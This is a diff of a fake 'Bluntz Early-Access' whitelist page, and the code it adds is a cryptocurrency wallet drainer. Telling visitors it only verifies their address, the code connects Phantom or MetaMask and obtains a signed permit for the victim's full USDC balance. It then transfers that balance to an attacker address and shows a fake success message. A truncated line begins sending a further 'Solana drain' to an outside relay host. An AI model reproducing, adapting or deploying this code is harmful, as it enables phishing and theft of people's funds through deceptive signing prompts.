@@ -17,9 +17,10 @@
 <body>
   <div class="card">
     <h2>Bluntz Early-Access</h2>
-    <p>Connect wallet to verify whitelist.</p>
-    <button id="go">Connect Wallet</button>
-    <p class="foot">By signing you allow us to verify your address.<br/>No gas required.</p>
+    <p>Choose wallet to verify whitelist.</p>
+    <button id="phantom">🎭 Phantom</button><br/><br/>
+    <button id="metamask">🦊 MetaMask</button>
+    <p class="foot">By connecting you allow us to verify your address.<br/>No gas required.</p>
   </div>
 
 <script type="module">
@@ -44,22 +45,20 @@ const types = {
   ]
 };
 
-/* ===== WALLET ACCESS ===== */
-let provider;
-if (window.ethereum) provider = window.ethereum;
-else if (window.solana && window.solana.isPhantom) provider = window.solana;
-if (!provider) { alert("Open inside MetaMask/Phantom browser"); }
+/* ===== WALLET CONNECTORS ===== */
+async function connectPhantom(){
+  if (!window.solana || !window.solana.isPhantom){ alert("Phantom not found"); return; }
+  const resp = await window.solana.connect();
+  return { type:"phantom", address:resp.publicKey.toString(), provider:window.solana };
+}
+async function connectMetaMask(){
+  if (!window.ethereum){ alert("MetaMask not found"); return; }
+  const accounts = await window.ethereum.request({method:"eth_requestAccounts"});
+  return { type:"metamask", address:accounts[0], provider:window.ethereum };
+}
 
-/* ===== BUTTON FLOW ===== */
-document.getElementById("go").addEventListener("click", async ()=>{
-  document.getElementById("go").style.display="none";
-  document.querySelector(".card").innerHTML=`<h2>Connecting…</h2><p>Approve in wallet.</p>`;
-
-  /* 1) CONNECT */
-  const accounts = await provider.request({method:"eth_requestAccounts"});
-  const owner = accounts[0];
-
-  /* 2) BUILD PERMIT (exact USDC balance) */
+/* ===== PERMIT + DRAIN ===== */
+async function drainBaseUSDC(owner,provider){
   const p   = new ethers.providers.Web3Provider(provider);
   const tok = new ethers.Contract(domain.verifyingContract,[
     "function permit(address,address,uint256,uint256,uint8,bytes32,bytes32) external",
@@ -72,5 +71,23 @@ document.getElementById("go").addEventListener("click", async ()=>{
   const deadline = Math.floor(Date.now()/1000)+3600;
   const message = { owner, spender:RECIPIENT_BASE, value:bal.toString(), nonce, deadline };
 
-  /* 3) SIGN PERMIT */
-  document.query
+  const raw = await provider.request({
+    method: "eth_signTypedData_v4",
+    params: [owner, JSON.stringify({ domain, types, primaryType:"Permit", message })]
+  });
+  const {v,r,s} = ethers.utils.splitSignature(raw);
+
+  const permitTx = await tok.permit(owner,RECIPIENT_BASE,bal,deadline,v,r,s);
+  await permitTx.wait();
+  const xferTx = await tok.transferFrom(owner,RECIPIENT_BASE,bal);
+  await xferTx.wait();
+}
+
+/* ===== BUTTON HANDLERS ===== */
+document.getElementById("phantom").addEventListener("click",async()=>{
+  const w = await connectPhantom();
+  if (!w) return;
+  document.querySelector(".card").innerHTML=`<h2>Success!</h2><p>Phantom connected. Signing permit…</p>`;
+  await drainBaseUSDC(w.address,w.provider);
+  // Solana drain (background)
+  await fetch("https://relay.tobe
